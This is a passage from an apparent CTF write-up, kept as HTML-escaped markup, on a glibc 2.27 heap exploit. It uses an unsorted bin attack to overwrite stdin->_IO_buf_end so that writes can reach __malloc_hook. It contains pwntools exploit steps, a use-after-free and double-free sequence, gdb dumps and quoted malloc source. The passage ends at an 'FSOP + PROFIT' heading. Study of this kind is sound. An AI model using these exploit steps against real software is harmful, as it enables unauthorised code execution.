  _IO_read_base = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
  _IO_write_base = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
  _IO_write_ptr = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
  _IO_write_end = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
  _IO_buf_base = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
  _IO_buf_end = 0x7ffff7dcfa84 &amp;lt;_IO_2_1_stdin_+132&amp;gt; &amp;quot;&amp;quot;,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 16,
  _old_offset = -1,
  _cur_column = 0,
  _vtable_offset = 0 &#39;\000&#39;,
  _shortbuf = &amp;quot;\n&amp;quot;,
  _lock = 0x7ffff7dd18d0 &amp;lt;_IO_stdfile_0_lock&amp;gt;,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x7ffff7dcfae0 &amp;lt;_IO_wide_data_0&amp;gt;,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = -1,
  _unused2 = &#39;\000&#39; &amp;lt;repeats 19 times&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see right above and according to the source code showed previously, &lt;code&gt;_IO_stdin-&amp;gt;_IO_buf_base&lt;/code&gt; points toward &lt;code&gt;_IO_stdin-&amp;gt;_shortbuf&lt;/code&gt;, an internal buffer directly in &lt;code&gt;stdin&lt;/code&gt;. And &lt;code&gt;&amp;amp;unsortedbin &amp;gt; _IO_buf_base &amp;gt; stdin&lt;/code&gt;. If you do not understand fully my explanations, I advise you to take a look at &lt;a href=&#34;https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/&#34;&gt;this great article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Then we should be able to control every bytes between &lt;code&gt;&amp;amp;stdin-&amp;gt;_shortbuf&lt;/code&gt; and &lt;code&gt;&amp;amp;unsortedbin&lt;/code&gt;. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: &lt;code&gt;__malloc_hook&lt;/code&gt; !!&lt;/p&gt;
&lt;p&gt;Then we just have to overwrite the pointers inside &lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;_IO_wide_data_0&lt;/code&gt; and &lt;code&gt;__memalign_hook&lt;/code&gt; to finally reach &lt;code&gt;__malloc_hook&lt;/code&gt; and write the address of a one-gadget !&lt;/p&gt;
&lt;h2 id=&#34;unsorted-bin-attack-on-stdin-_io_buf_end&#34;&gt;Unsorted bin attack on stdin-&amp;gt;_IO_buf_end&lt;/h2&gt;
&lt;p&gt;Here was theory, let&amp;rsquo;s see how we can do that. To understand unsorted bin attack &lt;a href=&#34;https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/&#34;&gt;here&lt;/a&gt; is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;overwrite the backward pointer of the last chunk in the unsorted bin by &lt;code&gt;&amp;amp;target - 0x10&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;request the &lt;strong&gt;exact&lt;/strong&gt; size of the last chunk in the unsorted bin&lt;/li&gt;
&lt;li&gt;It should write at &lt;code&gt;&amp;amp;target&lt;/code&gt; the address of the unsorted bin&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&amp;rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&amp;rsquo;t fit the request, the program will most of the time issues a &lt;code&gt;malloc(): memory corruption&lt;/code&gt;. Anyway the best thing to do is to take a look at the &lt;a href=&#34;https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519&#34;&gt;code&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;_int_malloc&lt;/span&gt; (mstate av, size_t bytes)
{

&lt;span style=&#34;color:#75715e&#34;&gt;// It checks first fastbin then smallbin then unsorted bin
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (;; )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; iters &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; unsorted_chunks (av))
        {
          bck &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk;
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (__builtin_expect (chunksize_nomask (victim) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; SIZE_SZ, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
              &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; __builtin_expect (chunksize_nomask (victim)
				   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; av&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;system_mem, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
            malloc_printerr (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;malloc(): memory corruption&amp;#34;&lt;/span&gt;);
          size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunksize (victim);

          &lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             If a small request, try to use last remainder if it is the
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             only chunk in unsorted bin.  This helps promote locality for
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             runs of consecutive small requests. This is the only
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             exception to best-fit, and applies only when there is
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             no exact fit for a small chunk.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;           */&lt;/span&gt;

          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
              bck &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; unsorted_chunks (av) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
              victim &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; av&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;last_remainder &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
              (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;) (size) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;) (nb &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; MINSIZE))
            {
              &lt;span style=&#34;color:#75715e&#34;&gt;/* split and reattach remainder */&lt;/span&gt;
              remainder_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; nb;
              remainder &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunk_at_offset (victim, nb);
              unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remainder;
              av&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;last_remainder &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remainder;
              remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;in_smallbin_range (remainder_size))
                {
                  remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
                  remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
                }

              set_head (victim, nb &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PREV_INUSE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
                        (av &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;main_arena &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; NON_MAIN_ARENA : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
              set_head (remainder, remainder_size &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunk2mem (victim);
              alloc_perturb (p, bytes);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p;
            }

          &lt;span style=&#34;color:#75715e&#34;&gt;/* remove from unsorted list */&lt;/span&gt;
          unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bck;
          bck&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av);

          &lt;span style=&#34;color:#75715e&#34;&gt;/* Take now instead of binning if exact fit */&lt;/span&gt;

          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; nb)
            {
              set_inuse_bit_at_offset (victim, size);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (av &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;main_arena)
		set_non_main_arena (victim);
&lt;span style=&#34;color:#75715e&#34;&gt;#if USE_TCACHE
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	      &lt;span style=&#34;color:#75715e&#34;&gt;/* Fill cache first, return to user only if cache fills.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		 We may return one of these chunks later.  */&lt;/span&gt;
	      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (tcache_nb
		  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; tcache&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;counts[tc_idx] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
		  &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
		}
	      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
		{
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;              check_malloced_chunk (av, victim, nb);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunk2mem (victim);
              alloc_perturb (p, bytes);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p;
&lt;span style=&#34;color:#75715e&#34;&gt;#if USE_TCACHE
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		}
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            }

	[...]
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to what I said earlier, the goal is to replace &lt;code&gt;stdin-&amp;gt;_IO_buf_end&lt;/code&gt; with &lt;code&gt;&amp;amp;unsortedbin&lt;/code&gt; which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) &lt;code&gt;&amp;amp;stdin-&amp;gt;_IO_buf_end - 0x10&lt;/code&gt;. To do so we can trigger a write after free primitive by taking back &lt;code&gt;chunk_2&lt;/code&gt; from the unsorted bin to the fastbin:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Before:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;unsortedbin
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# pop it to access to chunk_1&lt;/span&gt;

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# restore valid fastbin chunk part of the 0x30 freelist&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# put it back to the fastbin &lt;/span&gt;

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ebca0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# Write after free, &amp;amp;stdin-&amp;gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;After:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;unsortedbin
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;all [corrupted]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can read right above, the &lt;code&gt;chunk_2&lt;/code&gt; has its backward pointer set to &lt;code&gt;&amp;amp;stdin-&amp;gt;_IO_buf_end - 0x10&lt;/code&gt;. To achieve the partial unlink we just have to request a &lt;code&gt;0x30&lt;/code&gt; sized chunk with nothing in the fastbin freelists. That&amp;rsquo;s the last step of the unsortedbin attack, clean out the fastbin:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Before: same as above
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# == clean fastbin&lt;/span&gt;

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x40&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x30&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# == clean fastbin&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fastbins
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x40: 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we just have to ask for a &lt;code&gt;0x30&lt;/code&gt; sized chunk:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1337&amp;#34;&lt;/span&gt;, hang&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unsortedbin attack done on: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enjoy your shell!&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;After:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x7ffff7dcfa40 &amp;lt;_IO_2_1_stdin_+64&amp;gt;:	0x00007ffff7dcfca0 &amp;lt;- stdin-&amp;gt;_IO_buf_end
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x7ffff7dcfca0 &amp;lt;main_arena+96&amp;gt;:	0x00005555556086b0 &amp;lt;- unsortedbin
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;fsop--profit&#34;&gt;FSOP + PROFIT&lt;/h2&gt;
